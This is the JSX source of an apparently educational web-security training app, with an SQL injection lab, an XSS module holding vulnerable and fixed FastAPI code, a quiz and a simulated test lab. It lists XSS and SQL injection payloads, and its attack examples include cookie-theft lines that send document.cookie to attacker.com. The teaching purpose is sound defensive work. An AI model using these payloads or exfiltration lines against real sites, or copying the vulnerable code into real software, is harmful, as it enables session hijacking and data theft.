                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: admin' OR '1'='1"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button
                    onClick={handleLabSubmit}
                    className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold transition-all"
                  >
                    Execute Query
                  </button>
                </div>
              </div>

              {labResult && (
                <div className="mt-6 space-y-4">
                  <div className={`rounded-lg p-4 border ${
                    labResult.safe 
                      ? 'bg-green-900/20 border-green-500/50' 
                      : 'bg-red-900/20 border-red-500/50'
                  }`}>
                    <h4 className="font-bold mb-2 flex items-center gap-2">
                      {labResult.safe ? (
                        <CheckCircle className="w-5 h-5 text-green-400" />
                      ) : (
                        <XCircle className="w-5 h-5 text-red-400" />
                      )}
                      {labResult.message}
                    </h4>
                    <p className="text-sm mb-2">
                      <strong>Generated SQL Query:</strong>
                    </p>
                    <code className="block bg-slate-900 p-3 rounded text-sm text-purple-300 overflow-x-auto">
                      {labResult.query}
                    </code>
                    {labResult.impact && (
                      <div className="mt-3 p-3 bg-red-900/30 border border-red-500/50 rounded">
                        <p className="text-sm font-bold text-red-400">{labResult.impact}</p>
                      </div>
                    )}
                    
                    {!labResult.safe && (
                      <div className="mt-3 p-3 bg-blue-900/20 border border-blue-500/50 rounded">
                        <p className="text-sm text-blue-300">
                          <strong>What Happened:</strong> The input was treated as SQL code instead of data. 
                          Special characters like <code className="bg-slate-800 px-1 rounded">'</code> and 
                          keywords like <code className="bg-slate-800 px-1 rounded">OR</code> changed the query logic.
                        </p>
                      </div>
                    )}
                  </div>

                  {labResult.data.length > 0 && (
                    <div className="bg-slate-900 rounded-lg p-4">
                      <h4 className="font-bold mb-3">Database Query Results:</h4>
                      <div className="overflow-x-auto">
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b border-slate-700">
                              <th className="text-left p-2">ID</th>
                              <th className="text-left p-2">Username</th>
                              <th className="text-left p-2">Password</th>
                              <th className="text-left p-2">Email</th>
                            </tr>
                          </thead>
                          <tbody>
                            {labResult.data.map((user, idx) => (
                              <tr key={idx} className="border-b border-slate-800">
                                <td className="p-2">{user.id}</td>
                                <td className="p-2">{user.username}</td>
                                <td className="p-2 text-red-400 font-mono">{user.password}</td>
                                <td className="p-2">{user.email}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                      {labResult.data.length > 1 && !labResult.safe && (
                        <p className="mt-3 text-sm text-red-400 font-semibold">
                          ⚠️ Notice: Query returned {labResult.data.length} users when it should only return 1! 
                          This is a successful SQL injection attack.
                        </p>
                      )}
                    </div>
                  )}

                  {/* Show how parameterized query would prevent this */}
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-2">✅ How Parameterized Query Prevents This:</h4>
                    <code className="block bg-slate-900 p-3 rounded text-sm text-green-300 mb-2">
                      cursor.execute("SELECT * FROM users WHERE username = ?", ("{labInput}",))
                    </code>
                    <p className="text-sm text-slate-300">
                      With parameterized queries, your input <code className="bg-slate-800 px-2 py-1 rounded">{labInput}</code> would 
                      be treated as a literal string value. The database would search for a username that exactly matches that entire 
                      string (including quotes and SQL keywords), finding nothing. <strong className="text-green-400">Attack blocked!</strong>
                    </p>
                  </div>
                </div>
              )}
            </div>

            <button
              onClick={() => setActiveTab('quiz')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg"
            >
              Ready for the Quiz? →
            </button>
          </div>
        )}

        {/* Quiz Tab */}
        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz 
              questions={quizQuestions}
              onComplete={() => onSectionComplete('quiz')}
            />
          </div>
        )}
      </div>
    </div>
  );
};

// ============================================================================
// XSS MODULE
// ============================================================================

const XSSModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`;

  const secureCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    # SAFE: Escape HTML special characters
    safe_query = html.escape(query)
    
    response = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {safe_query}</p>
        </body>
    </html>
    """
    return response`;

  const comparisonCode = `from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """✅ SECURE - Escapes user input"""
    
    # ❌ OLD (VULNERABLE): Direct insertion into HTML
    # html_content = f"<p>You searched for: {query}</p>"
    
    # ✅ NEW (SECURE): Escape HTML special characters
    safe_query = html.escape(query)
    html_content = f"<p>You searched for: {safe_query}</p>"
    
    return f"""
    <html>
        <body>
            <h1>Search Results</h1>
            {html_content}
        </body>
    </html>
    """`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes XSS attacks possible?",
      options: [
        "Weak passwords",
        "Inserting untrusted data into web pages without proper encoding",
        "Using old browsers",
        "Not using HTTPS"
      ],
      correct: 1,
      explanation: "XSS occurs when untrusted data (user input) is inserted into web pages without proper encoding/escaping, allowing malicious scripts to execute."
    },
    {
      id: 2,
      question: "What is the primary defense against XSS?",
      options: [
        "Using HTTPS only",
        "Disabling JavaScript",
        "HTML encoding/escaping user input",
        "Hiding the source code"
      ],
      correct: 2,
      explanation: "HTML encoding (escaping) converts special characters like < > & into safe HTML entities, preventing browsers from interpreting them as code."
    },
    {
      id: 3,
      question: "What does html.escape() do in Python?",
      options: [
        "Removes all HTML from input",
        "Converts special characters to HTML entities",
        "Encrypts the HTML",
        "Compresses the HTML"
      ],
      correct: 1,
      explanation: "html.escape() converts characters like < to &lt; and > to &gt;, making them display as text instead of being interpreted as HTML/JavaScript."
    },
    {
      id: 4,
      question: "Which type of XSS injects malicious scripts that are stored in the database?",
      options: [
        "Reflected XSS",
        "DOM-based XSS",
        "Stored (Persistent) XSS",
        "Client-side XSS"
      ],
      correct: 2,
      explanation: "Stored XSS saves malicious scripts in the database (e.g., in comments or profiles), which then execute when other users view that content."
    }
  ];

  const handleLabSubmit = () => {
    const lowerInput = labInput.toLowerCase();
    
    // Detect different types of XSS attacks
    const hasScript = lowerInput.includes('<script');
    const hasImgOnerror = lowerInput.includes('onerror');
    const hasOnload = lowerInput.includes('onload');
    const hasSvg = lowerInput.includes('<svg');
    const hasIframe = lowerInput.includes('<iframe');
    const hasEventHandler = lowerInput.includes('on') && (lowerInput.includes('=') || lowerInput.includes('click') || lowerInput.includes('mouse'));
    
    const isAttack = hasScript || hasImgOnerror || hasOnload || hasSvg || hasIframe || hasEventHandler;
    
    let attackType = '';
    let attackExplanation = '';
    
    if (hasScript) {
      attackType = 'Direct Script Injection';
      attackExplanation = 'The <script> tag would execute JavaScript immediately when the page loads. This is the most common XSS attack vector.';
    } else if (hasImgOnerror) {
      attackType = 'Image Event Handler Attack';
      attackExplanation = 'The onerror event handler fires when the image fails to load. Since "x" is not a valid image, the malicious JavaScript in onerror executes.';
    } else if (hasSvg && hasOnload) {
      attackType = 'SVG-based XSS';
      attackExplanation = 'SVG elements support onload events. This payload executes JavaScript when the SVG loads.';
    } else if (hasIframe) {
      attackType = 'Iframe Injection';
      attackExplanation = 'Iframes can load external malicious content or execute JavaScript via the src attribute.';
    } else if (hasEventHandler) {
      attackType = 'Event Handler Injection';
      attackExplanation = 'HTML event handlers (onclick, onmouseover, etc.) can execute JavaScript when triggered by user interaction.';
    }
    
    setLabResult({
      input: labInput,
      vulnerable: `<p>You searched for: ${labInput}</p>`,
      secure: `<p>You searched for: ${labInput.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;')}</p>`,
      isAttack,
      attackType,
      attackExplanation
    });
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Eye className="w-10 h-10 text-orange-400" />
            <h1 className="text-4xl font-bold">Cross-Site Scripting (XSS)</h1>
          </div>
          
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding XSS - Three Main Types
              </h3>
              
              <p className="text-slate-300 mb-4">
                Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages. There are three primary types of XSS attacks, each with different characteristics and attack vectors.
              </p>

              {/* Type 1: Reflected XSS */}
              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-3">🔴 Type 1: Reflected XSS (Non-Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is reflected off the web server, typically through URL parameters or form inputs. The attack is delivered via a crafted link.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search", response_class=HTMLResponse)
async def search(query: str):
    """⚠️ VULNERABLE - Reflected XSS"""
    # DANGEROUS: Direct insertion of user input into HTML
    html = f"""
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {query}</p>
        </body>
    </html>
    """
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/search?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    When victim clicks the link, the script executes in their browser immediately.
                  </p>
                </div>
              </div>

              {/* Type 2: Stored XSS */}
              <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-orange-400 mb-3">🟠 Type 2: Stored XSS (Persistent)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The malicious script is permanently stored on the target server (database, comment system, user profile). Every user who views the affected page gets attacked.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable Code:</p>
                  <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """⚠️ VULNERABLE - Stores unsanitized input"""
    comments_db.append({"username": username, "comment": comment})
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """⚠️ VULNERABLE - Displays unsanitized stored data"""
    html = "<html><body><h1>Comments</h1>"
    for c in comments_db:
        # DANGEROUS: Directly embedding stored user input
        html += f"<p><b>{c['username']}</b>: {c['comment']}</p>"
    html += "</body></html>"
    return html`} />
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Scenario:</p>
                  <p className="text-xs text-slate-300 mb-2">1. Attacker posts comment: <code className="bg-slate-700 px-1 rounded text-red-300">&lt;script&gt;steal_cookies()&lt;/script&gt;</code></p>
                  <p className="text-xs text-slate-300 mb-2">2. Malicious script saved to database</p>
                  <p className="text-xs text-slate-300">3. Every user viewing comments gets attacked automatically</p>
                  <p className="text-xs text-red-400 mt-2">⚠️ Most dangerous - affects all users, not just link clickers!</p>
                </div>
              </div>

              {/* Type 3: DOM-based XSS */}
              <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-yellow-400 mb-3">🟡 Type 3: DOM-Based XSS (Client-Side)</h4>
                <p className="text-sm text-slate-300 mb-3">
                  The vulnerability exists in client-side JavaScript code. The attack payload is never sent to the server - it's executed entirely in the browser's DOM.
                </p>
                
                <div className="bg-slate-900 rounded-lg p-3 mb-3">
                  <p className="text-xs text-slate-400 mb-2">Vulnerable JavaScript Code:</p>
                  <pre className="bg-slate-800 p-3 rounded text-xs font-mono text-slate-300">
{`<script>
  // VULNERABLE: Reading from URL and inserting into DOM
  const params = new URLSearchParams(window.location.search);
  const userInput = params.get('name');
  
  // DANGEROUS: Direct insertion into innerHTML
  document.getElementById('welcome').innerHTML = 
    'Hello ' + userInput;
</script>`}
                  </pre>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Attack Vector:</p>
                  <code className="text-xs text-red-300">
                    https://example.com/page#name=&lt;img src=x onerror=alert(1)&gt;
                  </code>
                  <p className="text-xs text-slate-400 mt-2">
                    The fragment (#) isn't sent to server, so server-side protections don't help. Pure client-side vulnerability.
                  </p>
                </div>
              </div>

              {/* Comparison Table */}
              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">XSS Type Comparison:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Type</th>
                        <th className="text-left p-2 text-purple-400">Stored on Server?</th>
                        <th className="text-left p-2 text-purple-400">Attack Delivery</th>
                        <th className="text-left p-2 text-purple-400">Severity</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Reflected</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">Crafted URL/link</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Stored</td>
                        <td className="p-2 text-slate-300">Yes (database)</td>
                        <td className="p-2 text-slate-300">Automatic on page load</td>
                        <td className="p-2 text-red-400">Critical</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">DOM-Based</td>
                        <td className="p-2 text-slate-300">No</td>
                        <td className="p-2 text-slate-300">URL fragment manipulation</td>
                        <td className="p-2 text-orange-400">Medium-High</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Attack Examples
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4 mb-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🍪 Session Hijacking</h4>
                  <p className="text-sm text-slate-300 mb-2">Steal session cookies to impersonate users</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-red-300">
                      &lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;
                    </code>
                  </div>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🎣 Credential Theft</h4>
                  <p className="text-sm text-slate-300 mb-2">Create fake login forms to capture passwords</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-orange-300">
                      Inject fake form overlaying real login
                    </code>
                  </div>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🔀 Page Defacement</h4>
                  <p className="text-sm text-slate-300 mb-2">Modify page content to spread misinformation</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-yellow-300">
                      document.body.innerHTML='Hacked!'
                    </code>
                  </div>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">📡 Keylogging</h4>
                  <p className="text-sm text-slate-300 mb-2">Record user keystrokes to capture sensitive data</p>
                  <div className="bg-slate-900 rounded-lg p-2 mt-2">
                    <code className="text-xs text-purple-300">
                      addEventListener('keypress', log)
                    </code>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-red-400">Detailed Attack Scenarios:</h4>
                <div className="space-y-3 text-sm">
                  <div className="border-l-4 border-red-500 pl-3">
                    <p className="font-semibold text-red-400 mb-1">Cookie Theft Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects: <code className="bg-slate-800 px-2 py-1 rounded text-xs">&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></p>
                    <p className="text-slate-400 text-xs">Impact: Session token sent to attacker, who can now impersonate the victim</p>
                  </div>

                  <div className="border-l-4 border-orange-500 pl-3">
                    <p className="font-semibold text-orange-400 mb-1">Phishing Attack:</p>
                    <p className="text-slate-300 mb-2">Attacker injects fake login form that submits to attacker's server</p>
                    <p className="text-slate-400 text-xs">Impact: Victims enter credentials thinking they're logging into legitimate site</p>
                  </div>

                  <div className="border-l-4 border-yellow-500 pl-3">
                    <p className="font-semibold text-yellow-400 mb-1">Malware Distribution:</p>
                    <p className="text-slate-300 mb-2">Inject script that redirects users to malware download sites</p>
                    <p className="text-slate-400 text-xs">Impact: Users' computers infected with ransomware, spyware, or trojans</p>
                  </div>

                  <div className="border-l-4 border-purple-500 pl-3">
                    <p className="font-semibold text-purple-400 mb-1">Cryptojacking:</p>
                    <p className="text-slate-300 mb-2">Inject cryptocurrency mining script that runs in victim's browser</p>
                    <p className="text-slate-400 text-xs">Impact: Victim's CPU used for mining, slowing down computer and increasing electricity costs</p>
                  </div>

                  <div className="border-l-4 border-blue-500 pl-3">
                    <p className="font-semibold text-blue-400 mb-1">Account Actions:</p>
                    <p className="text-slate-300 mb-2">Execute actions as the victim: post content, change settings, make purchases</p>
                    <p className="text-slate-400 text-xs">Impact: Unauthorized transactions, spam posts, reputation damage</p>
                  </div>
                </div>

                <div className="mt-4 p-3 bg-slate-800 rounded-lg">
                  <h5 className="font-bold mb-2 text-sm">📊 Real-World Statistics:</h5>
                  <ul className="space-y-1 text-xs text-slate-300">
                    <li>• XSS found in 53% of web applications (2023 security report)</li>
                    <li>• #1 most common vulnerability in OWASP Top 10</li>
                    <li>• Average remediation cost: $8,000 per vulnerability</li>
                    <li>• Famous victims: eBay, MySpace, YouTube, Facebook, Twitter</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Defense for Each XSS Type
              </h3>

              {/* Defense against Reflected XSS */}
              <div className="mb-6">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Reflected XSS:</h4>
                
                <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                  <button
                    onClick={() => setCodeView('comparison')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Before/After Comparison
                  </button>
                  <button
                    onClick={() => setCodeView('sidebyside')}
                    className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                      codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'
                    }`}
                  >
                    Side-by-Side View
                  </button>
                </div>

                {codeView === 'comparison' ? (
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <PythonCode code={comparisonCode} />
                  </div>
                ) : (
                  <div className="grid md:grid-cols-2 gap-4">
                    <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-red-400 mb-3 text-sm">❌ BEFORE:</h5>
                      <PythonCode code={vulnerableCode} />
                    </div>
                    <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                      <h5 className="font-bold text-green-400 mb-3 text-sm">✅ AFTER:</h5>
                      <PythonCode code={secureCode} />
                    </div>
                  </div>
                )}
              </div>

              {/* Defense against Stored XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against Stored XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires TWO layers: sanitize on INPUT (storage) AND escape on OUTPUT (display)
                </p>
                
                <PythonCode code={`from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import html
# Note: Install bleach library for HTML sanitization
# pip install bleach
import bleach

app = FastAPI()
comments_db = []

@app.post("/comment")
async def add_comment(username: str, comment: str):
    """✅ SECURE - Sanitize before storing"""
    
    # ✅ LAYER 1: Sanitize input before storing
    # Remove dangerous HTML tags, keep safe ones
    safe_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'u', 'p', 'br'],  # Allowed tags
        strip=True  # Remove disallowed tags
    )
    
    comments_db.append({
        "username": html.escape(username),
        "comment": safe_comment
    })
    return {"status": "saved"}

@app.get("/comments", response_class=HTMLResponse)
async def get_comments():
    """✅ SECURE - Escape on output as well"""
    html_content = "<html><body><h1>Comments</h1>"
    
    for c in comments_db:
        # ✅ LAYER 2: Escape again when displaying (defense in depth)
        safe_username = html.escape(c['username'])
        safe_comment = html.escape(c['comment'])
        html_content += f"<p><b>{safe_username}</b>: {safe_comment}</p>"
    
    html_content += "</body></html>"
    return html_content`} />
              </div>

              {/* Defense against DOM-based XSS */}
              <div className="mb-6 bg-slate-900/50 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold text-green-400 mb-3">✅ Defending Against DOM-Based XSS:</h4>
                <p className="text-sm text-slate-300 mb-3">
                  Requires secure JavaScript practices on the client-side
                </p>
                
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-red-400 mb-2 text-sm">❌ Vulnerable JavaScript:</h5>
                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// DANGEROUS: Using innerHTML
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .innerHTML = 'Hello ' + name;`}
                    </pre>
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-3">
                    <h5 className="font-bold text-green-400 mb-2 text-sm">✅ Secure JavaScript:</h5>
                    <pre className="bg-slate-900 p-3 rounded text-xs font-mono text-slate-300 overflow-x-auto">
{`// SAFE: Using textContent
const params = new URLSearchParams(
  window.location.search
);
const name = params.get('name');

document.getElementById('welcome')
  .textContent = 'Hello ' + name;
  
// Alternative: Create text node
const textNode = 
  document.createTextNode(name);
element.appendChild(textNode);

// Or escape HTML manually
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
element.innerHTML = escapeHtml(userInput);`}
                    </pre>
                  </div>
                </div>
              </div>

              {/* Best Practices Summary */}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">XSS Prevention Best Practices:</h4>
                <div className="grid md:grid-cols-2 gap-3 text-sm">
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Server-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>HTML Escape:</strong> Use html.escape() for all user input</li>
                      <li>• <strong>Context-Aware Encoding:</strong> Different escaping for HTML, JS, CSS, URLs</li>
                      <li>• <strong>Input Validation:</strong> Whitelist allowed characters/patterns</li>
                      <li>• <strong>Content Security Policy (CSP):</strong> Restrict script sources</li>
                    </ul>
                  </div>
                  <div>
                    <p className="font-semibold text-purple-300 mb-2">Client-Side Defenses:</p>
                    <ul className="space-y-1 text-slate-300">
                      <li>• <strong>Use textContent:</strong> Never innerHTML for user data</li>
                      <li>• <strong>Create Text Nodes:</strong> Use document.createTextNode()</li>
                      <li>• <strong>Avoid eval():</strong> Never use eval with user input</li>
                      <li>• <strong>Framework Protection:</strong> Use React, Vue (auto-escape)</li>
                      <li>• <strong>Manual Escaping:</strong> Escape HTML before inserting</li>
                    </ul>
                  </div>
                </div>

                <div className="mt-3 p-3 bg-slate-800 rounded-lg">
                  <p className="font-semibold text-blue-400 mb-2 text-sm">Content Security Policy Example:</p>
                  <PythonCode code={`from fastapi import Response

@app.get("/")
async def root():
    response = Response(content="<html>...</html>")
    
    # Add CSP header to block inline scripts
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:;"
    )
    
    return response`} />
                </div>
              </div>
            </div>

            <button
              onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all"
            >
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 XSS Testing Lab - Test All Three Types</h3>
              
              {/* Reflected XSS Test */}
              <div className="bg-slate-900 rounded-lg p-6 mb-4 border border-red-500/30">
                <h4 className="font-bold text-red-400 mb-3">🔴 Test 1: Reflected XSS</h4>
                <p className="text-sm text-slate-300 mb-3">Try injecting scripts via search query (non-persistent):</p>
                
                <div className="mb-3">
                  <label className="block mb-2 text-sm font-semibold">Enter Search Query:</label>
                  <div className="flex gap-3">
                    <input
                      type="text"
                      value={labInput}
                      onChange={(e) => setLabInput(e.target.value)}
                      placeholder="Try: <script>alert('Reflected XSS')</script>"
                      className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                    />
                    <button
                      onClick={handleLabSubmit}
                      className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold"
                    >
                      Test
                    </button>
                  </div>
                </div>

                <div className="bg-slate-800 rounded-lg p-3">
                  <p className="text-xs text-slate-400 mb-2">Common Reflected XSS Payloads to Try:</p>
                  <div className="space-y-1 text-xs">
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;img src=x onerror=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;svg onload=alert('XSS')&gt;</code>
                    <code className="block bg-slate-900 px-2 py-1 rounded text-purple-300">&lt;body onload=alert('XSS')&gt;</code>
                  </div>
                </div>
              </div>

              {labResult && (
                <div className="space-y-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Output (Reflected):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
                      <code className="text-sm text-slate-300">{labResult.vulnerable}</code>
                    </div>
                    {labResult.isAttack && (
                      <div className="space-y-2">
                        <p className="text-sm text-red-400 font-semibold">
                          ⚠️ XSS Attack Detected: {labResult.attackType}
                        </p>
                        <p className="text-sm text-slate-300 bg-red-900/20 p-3 rounded">
                          {labResult.attackExplanation}
                        </p>
                      </div>
                    )}
                  </div>

                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-2">✅ Secure Output (Escaped):</h4>
                    <div className="bg-slate-900 p-3 rounded mb-2">
